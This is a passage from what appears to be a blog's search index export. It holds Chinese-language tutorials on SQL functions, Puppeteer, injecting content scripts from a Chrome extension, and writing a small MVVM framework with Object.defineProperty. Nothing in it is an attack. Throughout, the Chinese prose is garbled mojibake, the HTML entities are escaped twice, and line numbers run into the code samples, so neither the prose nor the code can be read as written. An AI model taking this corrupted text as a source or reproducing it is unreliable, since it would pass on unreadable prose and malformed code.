·ç‚¼æˆçš„ï¼Ÿã€‹ || 2 | ã€ŠMySQL ä»èŒæ–°åˆ°åˆ åº“è·‘è·¯ã€‹ || 3 | ã€Šèœé¸¡è¸©å‘è®°ã€‹ |+----+--------------------------------------+ 6. å‡½æ•°6.1 è¯­æ³•select function(column) from table_name 6.2 åˆè®¡å‡½æ•°ï¼ˆAggregate functionsï¼‰åˆè®¡å‡½æ•°çš„æ“ä½œé¢å‘ä¸€ç³»åˆ—çš„å€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªå•ä¸€çš„å€¼ã€‚é€šå¸¸ä¸ group by è¯­å¥ä¸€èµ·ç”¨ã€‚ å‡½æ•° æè¿° avg(column) è¿”å›æŸåˆ—çš„å¹³å‡å€¼ count(column) è¿”å›æŸåˆ—çš„è¡Œæ•°ï¼ˆä¸åŒ…æ‹¬ NULL å€¼ï¼‰ count(*) è¿”å›è¢«é€‰è¡Œæ•° first(column) è¿”å›åœ¨æŒ‡å®šçš„åŸŸä¸­ç¬¬ä¸€ä¸ªè®°å½•çš„å€¼ last(column) è¿”å›åœ¨æŒ‡å®šçš„åŸŸä¸­æœ€åä¸€ä¸ªè®°å½•çš„å€¼ max(column) è¿”å›æŸåˆ—çš„æœ€é«˜å€¼ min(column) è¿”å›æŸåˆ—çš„æœ€ä½å€¼ sum(column) è¿”å›æŸåˆ—çš„æ€»å’Œ 6.3 æ ‡é‡å‡½æ•°ï¼ˆScalar functionsï¼‰ å‡½æ•° æè¿° ucase(c) è½¬æ¢ä¸ºå¤§å†™ lcase(c) è½¬æ¢ä¸ºå°å†™ mid(c, start[, end]) ä»æ–‡æœ¬æå–å­—ç¬¦ len(c) è¿”å›æ–‡æœ¬é•¿åº¦ instr(c, char) è¿”å›åœ¨æ–‡æœ¬ä¸­æŒ‡å®šå­—ç¬¦çš„æ•°å€¼ä½ç½® left(c, number_of_char) è¿”å›æ–‡æœ¬çš„å·¦ä¾§éƒ¨åˆ† right(c, number_of_char) è¿”å›æ–‡æœ¬çš„å³ä¾§éƒ¨åˆ† round(c, decimals) å¯¹æ•°å€¼æŒ‡å®šå°æ•°ä½æ•°å››èˆäº”å…¥ mod(x, y) å–ä½™ï¼ˆæ±‚æ¨¡ï¼‰ now() è¿”å›å½“å‰çš„ç³»ç»Ÿæ—¥æœŸ format(c, format) æ ¼å¼åŒ–æ˜¾ç¤º datediff(d, date1, date2) æ—¥æœŸè®¡ç®—]]></content>
  </entry>
  <entry>
    <title><![CDATA[Puppeteer åˆä½“éªŒ]]></title>
    <url>%2F2019%2F10%2F02%2FNode.js%2FPuppeteer%20%E5%88%9D%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[å‚è€ƒæ–‡æ¡£ Puppeteer å®˜æ–¹æ–‡æ¡£ Puppeteer ä¸­æ–‡ API]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æŠ€æœ¯è¦ç‚¹]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2FChrome%20%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[å…ˆå†³æ¡ä»¶googleæµè§ˆå™¨å¿…é¡»é…ç½®å¦‚ä¸‹å¯åŠ¨å‚æ•°ï¼š â€“enable-benchmarking : å¯ç”¨åŸºå‡†æµ‹è¯•æ‰©å±• â€“enable-net-benchmarking : å¯ç”¨ç½‘ç»œåŸºå‡†æµ‹è¯•æ‰©å±• â€“remote-debugging-port=9222 : å¼€å¯è¿œç¨‹è°ƒè¯• é…ç½®macOS åˆ‡æ¢Googleå®‰è£…ç›®å½• 1cd &quot;/Applications/Google Chrome.app/Contents/MacOS/&quot; é‡å‘½åçš„å¯åŠ¨è„šæœ¬ 1sudo mv &quot;Google Chrome&quot; Google.real ç¼–è¾‘å¯åŠ¨è„šæœ¬ 1vim &quot;Google Chrome&quot; é”®å…¥å¯åŠ¨å‚æ•° 123#!/bin/bashcd &quot;/Applications/Google Chrome.app/Contents/MacOS&quot;&quot;/Applications/Google Chrome.app/Contents/MacOS/Google.real&quot; --enable-benchmarking --enable-net-benchmarkin åŠ¨æ€æ³¨å…¥ Content Scriptsåœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åŠ¨æ€çš„æ³¨å…¥ä¸€æ®µ Content Scriptsï¼Œæ¥è§¦è¾¾æˆ‘ä»¬çš„ä¸šåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™è¿™ç§æ–¹å¼å°±èƒ½å¾ˆå¥½çš„å¤„ç†è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¸»è¦åˆ©ç”¨äº† chrome.tabs.executeScript çš„èƒ½åŠ›æ¥è¾¾åˆ°åŠ¨æ€æ³¨å…¥çš„ç›®çš„ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆé…ç½® manifest.json æ–‡ä»¶ï¼Œå¦‚ï¼š 12345678910111213141516171819&#123; &quot;version&quot;: &quot;0.0.1&quot;, &quot;name&quot;: &quot;welearnmore-dynamic_content_scripts&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;welearnmore&quot;, &quot;browser_action&quot;: &#123; &quot;default_title&quot;: &quot;welearnmore dynamic content scripts&quot;, &quot;default_icon&quot;: &quot;img/logo.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;, &quot;background&quot;: &#123; &quot;scripts&quot;: [&quot;background.js&quot;], &quot;persistent&quot;: false &#125;, &quot;permissions&quot;: [ &quot;tabs&quot;, &quot;&lt;all_urls&gt;&quot; ]&#125; ç„¶ååœ¨ background.js ä¸­ï¼Œåˆ©ç”¨æ¶ˆæ¯é€šä¿¡çš„æœºåˆ¶ï¼Œå»æ‰“å¼€ä¸€ä¸ªtabï¼Œç”± Popup é¡µé¢ä¸­çš„æŸä¸ªæŒ‰é’®æ¥è§¦å‘ï¼š 12345chrome.runtime.onMessage.addListener(function(request, sender, sendResponse)&#123; chrome.tabs.create(&#123; url: &apos;https://icepy.me&apos;&#125;, function(tab)&#123; chrome.tabs.executeScript(tab.id, &#123;file: &apos;dynamic_content_scripts.js&apos;&#125;); &#125;);&#125;) dynamic_content_scripts.js éšä¾¿å†™ä¸€ä¸ª logï¼Œå¦‚ï¼š å‚è€ƒæ–‡æ¡£ å®˜æ–¹æ–‡æ¡£ Chrome Extension å…¥é—¨æŒ‡å— ä¸€ç¯‡æ–‡ç« æ•™ä½ é¡ºåˆ©å…¥é—¨å’Œå¼€å‘chromeæ‰©å±•ç¨‹åºï¼ˆæ’ä»¶ï¼‰]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[250è¡Œå®ç°ä¸€ä¸ªç®€å•çš„MVVM]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2F250%E8%A1%8C%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84MVVM%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼Œä½œè€…åšä¸»æ‹¿é“ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://saul-mirone.github.io/2016/12/19/simple-mvvm/ ä»€ä¹ˆæ˜¯MVVMï¼ŸMVVMæ˜¯ä¸€ç§ç¨‹åºæ¶æ„è®¾è®¡ã€‚æŠŠå®ƒæ‹†å¼€æ¥çœ‹åº”è¯¥æ˜¯Model-View-ViewModelã€‚ ModelModelæŒ‡çš„æ˜¯æ•°æ®å±‚ï¼Œæ˜¯çº¯å‡€çš„æ•°æ®ã€‚å¯¹äºå‰ç«¯æ¥è¯´ï¼Œå®ƒå¾€å¾€æ˜¯ä¸€ä¸ªç®€å•çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š 123456789&#123; name: &apos;mirone&apos;, age: 20, friends: [&apos;singleDogA&apos;, &apos;singleDogB&apos;], details: &#123; type: &apos;notSingleDog&apos;, tags: [&apos;fff&apos;, &apos;sox&apos;] &#125;&#125; æ•°æ®å±‚æ˜¯æˆ‘ä»¬éœ€è¦æ¸²æŸ“åå‘ˆç°ç»™ç”¨æˆ·çš„æ•°æ®ï¼Œæ•°æ®å±‚æœ¬èº«æ˜¯å¯å˜çš„ã€‚æ•°æ®å±‚ä¸åº”è¯¥æ‰¿æ‹…é€»è¾‘æ“ä½œå’Œè®¡ç®—çš„åŠŸèƒ½ã€‚ ViewViewæŒ‡è§†å›¾å±‚ï¼Œæ˜¯ç›´æ¥å‘ˆç°ç»™ç”¨æˆ·çš„éƒ¨åˆ†ï¼Œç®€å•çš„æ¥è¯´ï¼Œå¯¹äºå‰ç«¯å°±æ˜¯HTMLã€‚ä¾‹å¦‚ä¸Šé¢çš„æ•°æ®å±‚ï¼Œå®ƒå¯¹åº”çš„è§†å›¾å±‚å¯èƒ½æ˜¯ï¼š 123456789101112131415161718192021&lt;div&gt; &lt;p&gt; &lt;b&gt;name: &lt;/b&gt; &lt;span&gt;mirone&lt;/span&gt; &lt;/p&gt; &lt;p&gt; &lt;b&gt;age: &lt;/b&gt; &lt;span&gt;20&lt;/span&gt; &lt;/p&gt; &lt;ul&gt; &lt;li&gt;singleDogA&lt;/li&gt; &lt;li&gt;singleDogB&lt;/li&gt; &lt;/ul&gt; &lt;div&gt; &lt;p&gt;notSingleDog&lt;/p&gt; &lt;ul&gt; &lt;li&gt;fff&lt;/li&gt; &lt;li&gt;sox&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; å½“ç„¶è§†å›¾å±‚æ˜¯å¯å˜çš„ï¼Œä½ å®Œå…¨å¯ä»¥åœ¨å…¶ä¸­éšæ„æ·»åŠ å…ƒç´ ã€‚è¿™ä¸ä¼šæ”¹å˜æ•°æ®å±‚ï¼Œåªä¼šæ”¹å˜è§†å›¾å±‚å‘ˆç°æ•°æ®çš„æ–¹å¼ã€‚è§†å›¾å±‚åº”è¯¥å’Œæ•°æ®å±‚å®Œå…¨åˆ†ç¦»ã€‚ ViewModelæ—¢ç„¶è§†å›¾å±‚åº”è¯¥å’Œæ•°æ®å±‚åˆ†ç¦»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è®¾è®¡ä¸€ç§ç»“æ„ï¼Œè®©å®ƒä»¬å»ºç«‹èµ·æŸç§è”ç³»ã€‚å½“æˆ‘ä»¬å¯¹Modelè¿›è¡Œä¿®æ”¹çš„æ—¶å€™ï¼ŒViewModelå°±ä¼šæŠŠä¿®æ”¹è‡ªåŠ¨åŒæ­¥åˆ°Viewå±‚å»ã€‚åŒæ ·å½“æˆ‘ä»¬ä¿®æ”¹Viewï¼ŒModelåŒæ ·è¢«ViewModelè‡ªåŠ¨ä¿®æ”¹ã€‚ å¯ä»¥çœ‹å‡ºï¼Œå¦‚ä½•è®¾è®¡èƒ½å¤Ÿé«˜æ•ˆè‡ªåŠ¨åŒæ­¥Viewä¸Modelçš„ViewModelæ˜¯æ•´ä¸ªMVVMæ¡†æ¶çš„æ ¸å¿ƒå’Œéš¾ç‚¹ã€‚ MVVMçš„åŸç†å·®å¼‚ä¸åŒçš„æ¡†æ¶å¯¹äºMVVMçš„å®ç°æ˜¯ä¸åŒçš„ã€‚ æ•°æ®åŠ«æŒVueçš„å®ç°æ–¹å¼ï¼Œå¯¹æ•°æ®ï¼ˆModelï¼‰è¿›è¡ŒåŠ«æŒï¼Œå½“æ•°æ®å‘ç”Ÿå˜åŠ¨æ—¶ï¼Œæ•°æ®ä¼šè§¦å‘åŠ«æŒæ—¶ç»‘å®šçš„æ–¹æ³•ï¼Œå¯¹è§†å›¾è¿›è¡Œæ›´æ–°ã€‚ è„æ£€æŸ¥æœºåˆ¶Angularçš„å®ç°æ–¹å¼ï¼Œå½“å‘ç”Ÿäº†æŸç§äº‹ä»¶ï¼ˆä¾‹å¦‚è¾“å…¥ï¼‰ï¼ŒAngularä¼šæ£€æŸ¥æ–°çš„æ•°æ®ç»“æ„å’Œä¹‹å‰çš„æ•°æ®ç»“æ„æ˜¯å¦å‘ç”Ÿäº†å˜åŠ¨ï¼Œæ¥å†³å®šæ˜¯å¦æ›´æ–°è§†å›¾ã€‚ å‘å¸ƒè®¢é˜…æ¨¡å¼Knockoutçš„å®ç°æ–¹å¼ï¼Œå®ç°äº†ä¸€ä¸ªå‘å¸ƒè®¢é˜…å™¨ï¼Œè§£ææ—¶ä¼šåœ¨å¯¹åº”è§†å›¾èŠ‚ç‚¹ç»‘å®šè®¢é˜…å™¨ï¼Œè€Œåœ¨æ•°æ®ä¸Šç»‘å®šå‘å¸ƒå™¨ï¼Œå½“ä¿®æ”¹æ•°æ®æ—¶ï¼Œå°±å‡ºå‘äº†å‘å¸ƒå™¨ï¼Œè§†å›¾æ”¶åˆ°åè¿›è¡Œå¯¹åº”æ›´æ–°ã€‚ ç›¸åŒç‚¹ä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šç›¸åŒç‚¹çš„ï¼Œå®ƒä»¬éƒ½æœ‰ä¸‰ä¸ªæ­¥éª¤ï¼š è§£ææ¨¡ç‰ˆ è§£ææ•°æ® ç»‘å®šæ¨¡ç‰ˆä¸æ•°æ® è§£ææ¨¡ç‰ˆä½•è°“æ¨¡ç‰ˆï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä¸»æµMVVMçš„APIï¼š 12345678910111213141516171819202122232425&lt;!-- Vue --&gt;&lt;div id=&quot;mobile-list&quot;&gt; &lt;h1 v-text=&quot;title&quot;&gt;&lt;/h1&gt; &lt;ul&gt; &lt;li v-for=&quot;item in brands&quot;&gt; &lt;b v-text=&quot;item.name&quot;&gt;&lt;/b&gt; &lt;span v-show=&quot;showRank&quot;&gt;Rank: &#123;&#123;item.rank&#125;&#125;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;!-- Angular --&gt;&lt;ul&gt; &lt;li ng-repeat=&quot;phone in phones&quot;&gt; &#123;&#123;phone.name&#125;&#125; &lt;p&gt;&#123;&#123;phone.snippet&#125;&#125;&lt;/p&gt; &lt;/li&gt;&lt;/ul&gt;&lt;!-- Knockout --&gt;&lt;tbody data-bind=&quot;foreach: seats&quot;&gt; &lt;tr&gt; &lt;td data-bind=&quot;text: name&quot;&gt;&lt;/td&gt; &lt;td data-bind=&quot;text: meal().mealName&quot;&gt;&lt;/td&gt; &lt;td data-bind=&quot;text: meal().price&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; å¯ä»¥çœ‹åˆ°å®ƒä»¬éƒ½å®šä¹‰äº†è‡ªå·±çš„æ¨¡ç‰ˆå…³é”®å­—ï¼Œè¿™ä¸€æ¨¡å—çš„ä½œç”¨å°±æ˜¯æ ¹æ®è¿™äº›å…³é”®å­—è§£ææ¨¡ç‰ˆï¼Œå°†æ¨¡ç‰ˆå¯¹åº”åˆ°æœŸæœ›çš„æ•°æ®ç»“æ„ã€‚ è§£ææ•°æ®Modelä¸­çš„æ•°æ®ç»è¿‡åŠ«æŒæˆ–ç»‘å®šå‘å¸ƒå™¨æ¥è§£æã€‚æ•°æ®è§£æå™¨çš„ç¼–å†™è¦è€ƒè™‘VMçš„å®ç°æ–¹å¼ï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•è§£ææ•°æ®åªè¦åšå¥½ä¸€ä»¶äº‹ï¼šå®šä¹‰æ•°æ®å˜åŠ¨æ—¶è¦é€šçŸ¥çš„å¯¹è±¡ã€‚è§£ææ•°æ®æ—¶åº”ä¿è¯æ•°æ®è§£æåçš„ä¸€è‡´æ€§ï¼Œå¯¹äºæ¯ç§æ•°æ®è§£æåæš´éœ²çš„æ¥å£åº”è¯¥ä¿æŒä¸€è‡´ã€‚ ç»‘å®šæ¨¡ç‰ˆä¸æ•°æ®è¿™ä¸€éƒ¨åˆ†å®šä¹‰äº†æ•°æ®ç»“æ„ä»¥ä½•ç§æ–¹å¼å’Œæ¨¡ç‰ˆè¿›è¡Œç»‘å®šï¼Œå°±æ˜¯ä¼ è¯´ä¸­çš„â€œåŒå‘ç»‘å®šâ€ã€‚ç»‘å®šä¹‹åæˆ‘ä»¬ç›´æ¥å¯¹æ•°æ®è¿›è¡Œæ“ä½œæ—¶ï¼Œåº”ç”¨å°±èƒ½è‡ªåŠ¨æ›´æ–°è§†å›¾äº†ã€‚æ•°æ®å’Œæ¨¡ç‰ˆå¾€å¾€æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ï¼Œè€Œä¸”ä¸åŒçš„æ¨¡ç‰ˆæ›´æ–°æ•°æ®çš„æ–¹å¼å¾€å¾€ä¸åŒã€‚ä¾‹å¦‚æœ‰çš„æ˜¯æ”¹å˜æ ‡ç­¾çš„æ–‡æœ¬èŠ‚ç‚¹ï¼Œæœ‰çš„æ˜¯æ”¹å˜æ ‡ç­¾çš„classNameã€‚ åŠ¨æ‰‹å®ç°MVVMç»è¿‡ä¸€ç•ªåˆ†æï¼Œæ¥åŠ¨æ‰‹å®ç°MVVMå§ã€‚ æœŸæœ›æ•ˆæœå¯¹äºæˆ‘çš„MVVMï¼Œæˆ‘å¸Œæœ›å¯¹åº”ä¸€ä¸ªæ•°æ®ç»“æ„ï¼š 1234567891011121314151617let data = &#123; title: &apos;todo list&apos;, user: &apos;mirone&apos;, todos: [ &#123; creator: &apos;mirone&apos;, content: &apos;write mvvm&apos; done: &apos;undone&apos;, date: &apos;2016-11-17&apos;, members: [ &#123; name: &apos;kaito&apos; &#125; ] &#125; ]&#125; æˆ‘å¯ä»¥å¯¹åº”çš„ç¼–å†™æ¨¡ç‰ˆï¼š 123456789101112131415161718&lt;div id=&quot;root&quot;&gt; &lt;h1 data-model=&quot;title&quot;&gt;&lt;/h1&gt; &lt;div&gt; &lt;div data-model=&quot;user&quot;&gt;&lt;/div&gt; &lt;ul data-list=&quot;todos&quot;&gt; &lt;li data-list-item=&quot;todos&quot;&gt; &lt;p data-class=&quot;todos:done&quot; data-model=&quot;todos:creator&quot;&gt;&lt;/p&gt; &lt;p data-model=&quot;todos:date&quot;&gt;&lt;/p&gt; &lt;p data-model=&quot;todos:content&quot;&gt;&lt;/p&gt; &lt;ul data-list=&quot;todos:members&quot;&gt; &lt;li data-list-item=&quot;todos:members&quot;&gt; &lt;span data-model=&quot;todos:members:name&quot;&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; ç„¶åé€šè¿‡è°ƒç”¨ï¼š 1new Parser(&apos;#root&apos;, data) å°±å¯ä»¥å®Œæˆmvvmçš„ç»‘å®šï¼Œä¹‹åå¯ä»¥ç›´æ¥æ“ä½œdataå¯¹è±¡æ¥å¯¹Viewè¿›è¡Œæ›´æ”¹ã€‚ è§£ææ¨¡ç‰ˆæ¨¡ç‰ˆçš„è§£æå…¶å®æ˜¯ä¸€ä¸ªæ ‘çš„éå†è¿‡ç¨‹ã€‚ éå†ä¼—æ‰€å‘¨çŸ¥ï¼ŒDOMæ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå®ƒè¢«ç§°ä¸ºâ€œDOMæ ‘â€ã€‚ å¯¹äºæ ‘çš„éå†ï¼Œåªè¦é€’å½’ï¼Œä¾¿èƒ½å¾ˆè½»æ¾çš„å®Œæˆä¸€ä¸ªæ·±åº¦ä¼˜å…ˆéå†ï¼Œè¯·çœ‹ä»£ç ï¼š 12345678910function scan(node) &#123; console.log(node) for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] console.log(_thisNode) if(_thisNode.children.length) &#123; scan(_thisNode) &#125; &#125;&#125; è¿™ä¸ªå‡½æ•°éå†äº†ä¸€ä¸ªDOMèŠ‚ç‚¹ï¼Œä¾æ¬¡æ‰“å°éå†å¾—åˆ°çš„èŠ‚ç‚¹ã€‚ éå†ä¸åŒç»“æ„çŸ¥é“äº†å¦‚ä½•éå†ä¸€ä¸ªDOMæ ‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è·å–éœ€è¦åˆ†æçš„DOMæ ‘ï¼Ÿ æ ¹æ®ä¹‹å‰çš„æ„æƒ³ï¼Œæˆ‘ä»¬éœ€è¦è¿™ä¹ˆå‡ ç§æ ‡è¯†ï¼š - data-modelâ€”â€”ç”¨äºå°†DOMçš„æ–‡æœ¬èŠ‚ç‚¹æ›¿æ¢ä¸ºåˆ¶å®šå†…å®¹ - data-classâ€”â€”ç”¨äºå°† DOMçš„classNameæ›¿æ¢ä¸ºåˆ¶å®šå†…å®¹ - data-listâ€”â€”ç”¨äºæ ‡è¯†æ¥ä¸‹æ¥å°†å‡ºç°ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨ä¸ºåˆ¶å®šç»“æ„ - data-list-itemâ€”â€”ç”¨äºæ ‡è¯†åˆ—è¡¨é¡¹çš„å†…éƒ¨ç»“æ„ - data-eventâ€”â€”ç”¨äºä¸ºDOMèŠ‚ç‚¹ç»‘å®šæŒ‡å®šäº‹ä»¶ ç®€å•çš„å½’ç±»ä¸€ä¸‹ï¼šdata-modelã€data-classå’Œdata-eventåº”è¯¥æ˜¯ä¸€ç±»ï¼Œå®ƒä»¬éƒ½åªå½±å“å½“å‰èŠ‚ç‚¹ï¼›è€Œdata-listå’Œdata-itemä½œä¸ºåˆ—è¡¨åº”è¯¥è¦å•ç‹¬è€ƒè™‘ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™æ ·éå†ï¼š 123456789101112131415161718192021222324252627function scan(node) &#123; if(!node.getAttribute(&apos;data-list&apos;)) &#123; for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] parseModel(node) parseClass(node) parseEvent(node) if(_thisNode.children.length) &#123; scan(_thisNode) &#125; &#125; &#125; else &#123; parseList(node) &#125;&#125;function parseModel(node) &#123; //TODO:è§£æModelèŠ‚ç‚¹&#125;function parseClass(node) &#123; //TODO:è§£æclassName&#125;function parseEvent(node) &#123; //TODO:è§£æäº‹ä»¶&#125;function parseList(node) &#123; //TODO: è§£æåˆ—è¡¨&#125; è¿™æ ·æˆ‘ä»¬å°±æ­å¥½äº†éå†å™¨çš„å¤§æ¦‚æ¡†æ¶ ä¸åŒç»“æ„çš„å¤„ç†æ–¹æ³•parseModelï¼ŒparseClasså’ŒparseEventçš„å¤„ç†æ–¹å¼æ¯”è¾ƒç›¸ä¼¼ï¼Œå”¯ä¸€å€¼å¾—æ³¨æ„çš„å°±æ˜¯å¯¹äºåµŒå¥—å…ƒç´ çš„å¤„ç†ï¼Œå›å¿†ä¸€ä¸‹æˆ‘ä»¬çš„æ¨¡ç‰ˆè®¾è®¡ï¼š 12&lt;!--é‡åˆ°åµŒå¥—éƒ¨åˆ†--&gt;&lt;div data-model=&quot;todos:date&quot;&gt;&lt;/div&gt; è¿™é‡Œçš„todos:dateå…¶å®å¤§å¤§æ–¹ä¾¿äº†æˆ‘ä»¬è§£ææ¨¡ç‰ˆï¼Œå› ä¸ºå®ƒå±•ç¤ºäº†å½“å‰æ•°æ®åœ¨Modelç»“æ„ä¸­çš„ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//eventè¦æœ‰ä¸€ä¸ªeventList,å¤§æ¦‚ç»“æ„ä¸ºï¼šconst eventList = &#123; typeWriter: &#123; type: &apos;input&apos;, //äº‹ä»¶çš„ç§ç±» fn: function() &#123; //äº‹ä»¶çš„å¤„ç†å‡½æ•°ï¼Œå‡½æ•°çš„thisä»£è¡¨å‡½æ•°ç»‘å®šçš„DOMèŠ‚ç‚¹ &#125; &#125;&#125;function parseEvent(node) &#123; if(node.getAttribute(&apos;data-event&apos;)) &#123; const eventName = node.getAttribute(&apos;data-event&apos;) node.addEventListener(eventList[eventName].type, eventList[eventName].fn.bind(node)) &#125;&#125;//æ ¹æ®åœ¨æ¨¡ç‰ˆä¸­çš„ä½ç½®è§£ææ¨¡ç‰ˆï¼Œè¿™é‡Œçš„Pathæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»£è¡¨äº†å½“å‰æ•°æ®åœ¨Modelä¸­çš„ä½ç½®function parseData(str, node) &#123; const _list = str.split(&apos;:&apos;) let _data, _path let p = [] _list.forEach((key, index) =&gt; &#123; if(index === 0) &#123; _data = data[key] p.push(key) &#125; else &#123; _path = node.path[index-1] p.push(_path) _data = _data[_path][key] p.push(key) &#125; &#125;) return &#123; path: p, data: _data &#125;&#125;function parseModel(node) &#123; if(node.getAttribute(&apos;data-model&apos;)) &#123; const modelName = node.getAttribute(&apos;data-model&apos;) const _data = parseData(modelName, node) if(node.tagName === &apos;INPUT&apos;) &#123; node.value = _data.data &#125; else &#123; node.innerText = _data.data &#125; &#125;&#125;function parseClass(node) &#123; if(node.getAttribute(&apos;data-class&apos;)) &#123; const className = node.getAttribute(&apos;data-class&apos;) const _data = parseData(className, node) if(!node.classList.contains(_data.data)) &#123; node.classList.add(_data.data) &#125; &#125;&#125; æ¥ä¸‹æ¥è§£æåˆ—è¡¨ï¼Œæˆ‘ä»¬é‡åˆ°åˆ—è¡¨æ—¶ï¼Œåº”è¯¥å…ˆé€’å½’æ‰¾å‡ºåˆ—è¡¨é¡¹çš„ç»“æ„ 1234567891011121314151617181920parseListItem(node) &#123; let target !function getItem(node) &#123; for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] if(node.path) &#123; _thisNode.path = node.path.slice() &#125; parseEvent(_thisNode) parseClass(_thisNode) parseModel(_thisNode) if(_thisNode.getAttribute(&apos;data-list-item&apos;)) &#123; target = _thisNode &#125; else &#123; getItem(_thisNode) &#125; &#125; &#125;(node) return target&#125; ä¹‹ååœ¨ç”¨è¿™ä¸ªåˆ—è¡¨é¡¹æ¥æŒ‰éœ€æ‹·è´å‡ºä¸€å®šæ•°é‡çš„åˆ—è¡¨é¡¹ï¼Œå¹¶å¡«å……æ•°æ® 123456789101112131415161718function parseList(node) &#123; const _item = parseListItem(node) const _list = node.getAttribute(&apos;data-list&apos;) const _listData = parseData(_list, node) _listData.data.forEach((_dataItem, index) =&gt; &#123; const _copyItem = _item.cloneNode(true) if(node.path) &#123; _copyItem.path = node.path.slice() &#125; if(!_copyItem.path) &#123; _copyItem.path = [] &#125; _copyItem.path.push(index) scan(_copyItem) node.insertBefore(_copyItem, _item) &#125;) node.removeChild(_item)&#125; è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†æ¨¡ç‰ˆçš„æ¸²æŸ“ï¼Œscanå‡½æ•°ä¼šæ‰«ææ¨¡ç‰ˆå¯¹æ¨¡ç‰ˆè¿›è¡Œæ¸²æŸ“ è§£ææ•°æ®è§£æäº†æ¨¡ç‰ˆä¹‹åï¼Œæˆ‘ä»¬å°±è¦ç ”ç©¶å¦‚ä½•è¿›è¡Œæ•°æ®è§£æäº†ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨åŠ«æŒæ•°æ®çš„æ–¹æ³•æ¥è¿›è¡Œã€‚ æ™®é€šå¯¹è±¡çš„åŠ«æŒå¦‚ä½•åŠ«æŒæ•°æ®ï¼Ÿä¸€èˆ¬å¯¹æ•°æ®çš„åŠ«æŒéƒ½æ˜¯é€šè¿‡Object.definePropertyæ–¹æ³•è¿›è¡Œçš„ï¼Œå…ˆçœ‹ä¸€ä¸ªå°ä¾‹å­ï¼š 1234567891011121314151617181920212223var obj = &#123; name: &apos;mi&apos;&#125;function observe(obj, key) &#123; let old = obj[key] Object.defineProperty(obj, key, &#123; enumerable: true, configurable: true, get: function() &#123; return old &#125;, set: function(now) &#123; if(now !== old) &#123; console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) old = now &#125; &#125; &#125;)&#125;observe(obj, &apos;name&apos;)obj.name = &apos;mirone&apos;//è¾“å‡ºç»“æœï¼š//&quot;mi ---&gt; mirone&quot; è¿™æ ·æˆ‘ä»¬å°±é€šè¿‡object.definePropertyè¿›è¡Œäº†æ•°æ®åŠ«æŒï¼Œå¦‚æœæˆ‘ä»¬æƒ³è‡ªå®šä¹‰åŠ«æŒæ•°æ®æ—¶å‘ç”Ÿçš„æ“ä½œï¼Œåªè¦æ·»åŠ ä¸€ä¸ªå›è°ƒå‡½æ•°å‚æ•°å³å¯ï¼š 12345678910111213141516function observer(obj, k, callback) &#123; let old = obj[k] Object.defineProperty(obj, k, &#123; enumerable: true, configurable: true, get: function() &#123; return old &#125;, set: function(now) &#123; if(now !== old) &#123; callback(old, now) &#125; old = now &#125; &#125;)&#125; åµŒå¥—å¯¹è±¡çš„åŠ«æŒå¯¹äºå¯¹è±¡ä¸­çš„å¯¹è±¡ï¼Œæˆ‘ä¹ˆè¿˜éœ€è¦å¤šè¿›è¡Œä¸€ä¸ªæ­¥éª¤ï¼Œä½¿ç”¨é€’å½’æ¥åŠ«æŒå¯¹è±¡ä¸­çš„å¯¹è±¡ï¼š 1234567891011121314//å®ç°ä¸€ä¸ªobserveAllKeyå‡½æ•°ï¼ŒåŠ«æŒè¯¥å¯¹è±¡çš„æ‰€æœ‰å±æ€§function observeAllKey(obj, callback) &#123; Object.keys(obj).forEach(function(key)&#123; observer(obj, key, callback) &#125;)&#125;function observer(obj, k, callback) &#123; let old = obj[k] if (old.toString() === 